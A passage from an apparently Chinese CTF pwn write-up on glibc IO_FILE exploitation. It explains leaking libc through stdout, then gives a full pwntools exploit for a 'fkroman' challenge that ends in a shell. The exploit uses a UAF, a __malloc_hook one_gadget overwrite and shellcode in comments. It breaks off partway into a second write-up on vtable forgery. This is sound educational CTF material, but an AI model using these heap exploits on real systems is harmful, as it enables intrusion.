+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_puts (const char *str)</span><br><span class="line">&#123;</span><br><span class="line">  int result = EOF;</span><br><span class="line">  _IO_size_t len = strlen (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((_IO_vtable_offset (_IO_stdout) != <span class="number">0</span></span><br><span class="line">       || _IO_fwide (_IO_stdout, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (<span class="string">'\n'</span>, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>_IO_new_file_overflow源码分析：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_overflow (_IO_FILE *f, <span class="keyword">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;<span class="comment">//程序会dang，所以我们不能进入这个if分支，所以f-&gt;_flags &amp; _IO_NO_WRITES要等于0，所以flag=0xfbad0000</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    ......</span><br><span class="line">    ......</span><br><span class="line">      <span class="comment">//这个分支复杂，最后也会dang，我们不能进去，所以f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING=1即可，所以flag=0xfbad0800</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">			 f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); <span class="comment">//目标函数，这里执行_IO_do_write会涉及到syscall，相当于write(1,buf,size),由于目的就是泄露地址，所以buf=_IO_write_base就是我们要修改的值，一般将末尾改成'\x00'，原本是有值的</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="comment">/* Buffer is really full */</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (f) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  *f-&gt;_IO_write_ptr++ = ch;</span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == <span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">		      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">char</span>) ch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进去do_new_write:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span></span><br><span class="line">_IO_size_t</span><br><span class="line">new_do_write (_IO_FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, _IO_size_t to_do)</span><br><span class="line">&#123;<span class="comment">//相当于write(1，buf，size)</span></span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)<span class="comment">//要进去的话，flag=0xfbad1800</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;<span class="comment">//这里虽然可以改，但是如果改成相同的，程序会crash掉，所以要避免进去这个分支</span></span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">	= _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);	<span class="comment">//最终输出，系统调用write</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_cur_column &amp;&amp; count)</span><br><span class="line">    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - <span class="number">1</span>, data, count) + <span class="number">1</span>;</span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= <span class="number">0</span></span><br><span class="line">		       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))</span><br><span class="line">		       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);</span><br><span class="line">  <span class="keyword">return</span> count;<span class="comment">//回显出write出来的东西</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好了，源码解析完毕了，下面就是利用演示了：</p>
+<p>这种利用方法针对于没有puts打印函数的情况，但是需要一个前提，就是需要劫持到stdout结构体，一般来说是通过UAF(unsorted bin切割法得到地址，FD指向unsortedbin)，接着改FD的main_arena+88的末位（若没有则利用攻击global_max_fast的方式去做，使得有fastbin dump），变成stdout-xx的位置(得有0x7f或者0xff的size，0x7f在0x43的位置，0xff在0x51的位置)，下一次申请时就可以从上往下写，改写flag标志位为0xfbad1800固定值，同时修改IO_Write_base末尾为’\x00’，在flag位和IO_Write_base位之间填写的东西可以为任意值，我们的目的是下溢改写IO_Write_base。</p>
+<p><img src="/blog_img/1569051207124.png" alt="56905120712"></p>
+<p>程序就是常规的菜单题：</p>
+<p>我们整理出函数，没有puts打印函数，但是有UAF漏洞，可以free完改FD，也可以double free。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,size)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Content: "</span>)</span><br><span class="line">    sd(content)</span><br></pre></td></tr></table></figure>
+
+<p>这里有个问题就是搞到有unsorted_bin的FD指针的堆块，重复利用法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0</span>,<span class="number">0x400</span>)</span><br><span class="line">malloc(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">malloc(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">1</span>,<span class="string">'\xe0'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>先申请大块chunk，free用切割法得到有main_arena地址的chunk块，然后利用UAF改写FD指针指向我们的有main_arena地址的堆块，接着再edit这个堆块的FD为stdout-xx(成功实现劫持)，所以这个块是被使用了两次~</p>
+<p>再申请出来就可以改写stdout的标志位和输出位置了。有了真实地址后就可以再次改写FD指针然后改malloc_hook为我们的onegadget，即可getshell。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libformatstr <span class="keyword">import</span> FormatStr</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./fkroman'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./fkroman'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(index,size)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Your choice: "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Content: "</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x400</span>)</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    malloc(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">4</span>,<span class="number">1</span>,<span class="string">'\xe0'</span>)</span><br><span class="line">    malloc(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">5</span>,<span class="number">2</span>,<span class="string">'\xdd\x75'</span>)</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    malloc(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x33</span> + p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">5</span>,len(py),py)</span><br><span class="line">    rc(<span class="number">0x40</span>)</span><br><span class="line">    libc_base = u64(rc(<span class="number">8</span>)) - <span class="number">0x3c5600</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span> + hex(libc_base)</span><br><span class="line">    onegadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    fake_chunk = libc_base + libc.symbols[<span class="string">"__malloc_hook"</span>] - <span class="number">0x23</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="number">8</span>,p64(fake_chunk))</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'a'</span>*<span class="number">0x13</span> + p64(onegadget)</span><br><span class="line">    edit(<span class="number">6</span>,len(py),py)</span><br><span class="line">    malloc(<span class="number">7</span>,<span class="number">0x60</span>)</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line">        local = <span class="number">1</span></span><br><span class="line">        elf = ELF(<span class="string">'./fkroman'</span>)</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            p = process(<span class="string">'./fkroman'</span>)</span><br><span class="line">            libc = elf.libc</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">            libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sl(<span class="string">'cat flag'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>总结：这里有1/16的概率可以泄露地址来getshell，但是还是比较简单的，写个循环去爆破就好了。</p>
+<h4 id="四、先IO-File泄露地址再修改vtable控制程序流程"><a href="#四、先IO-File泄露地址再修改vtable控制程序流程" class="headerlink" title="四、先IO_File泄露地址再修改vtable控制程序流程"></a>四、先IO_File泄露地址再修改vtable控制程序流程</h4><p>拿byteCTF的那道note_five为例：</p>
+<p>这题质量还是挺高的，先来看看保护机制:</p>
+<p><img src="/blog_img/1569942154744.png" alt="56994215474"></p>
+<p>保护全开，然后看看ida分析逻辑：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> choice; <span class="comment">// ST0C_4</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  init_0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          choice = menu();</span><br><span class="line">          result = choice;</span><br><span class="line">          <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          edit();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( result &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( result != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        malloc_0();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( result != <span class="number">3</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      free_0();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">LABEL_12:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"bad choice"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>常见的菜单题，</p>
+<p><img src="/blog_img/1569942603583.png" alt="56994260358"></p>
+<p>这里malloc的大小时unsortedbin的范围，没有fastbin的攻击，继续。</p>
+<p>这里看看漏洞点：</p>
+<p><img src="/blog_img/1569942261741.png" alt="56994226174"></p>
+<p>edit时存在offbyone，同时没有puts函数可以泄露地址。</p>
+<p>攻击思路如下：</p>
+<p>1、利用offbyone实现overlap</p>
+<p>2、利用overlap实现改BK指针，攻击global_max_fast</p>
+<p>3、改FD指针为stdout-0x51，成功实现劫持</p>
+<p>4、改结构体从而泄露真实地址</p>
+<p>5、然后伪造stderr的vtable，由于程序报错会执行vtable+0x18处的IO_file_overflow函数，所以将这个IO_file_overflow函数改成onegadget</p>
+<p>6、malloc很大的块，最后触发IO_file_overflow中的_IO_flush_all_lockp，从而getshell。</p>
+<p><img src="/blog_img/1569945627721.png" alt="56994562772"></p>
+<p>这里_wide_data要填我们劫持的地址+1的位置，同时要改_mode为1，表示报错模块。</p>
+<p>上exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span 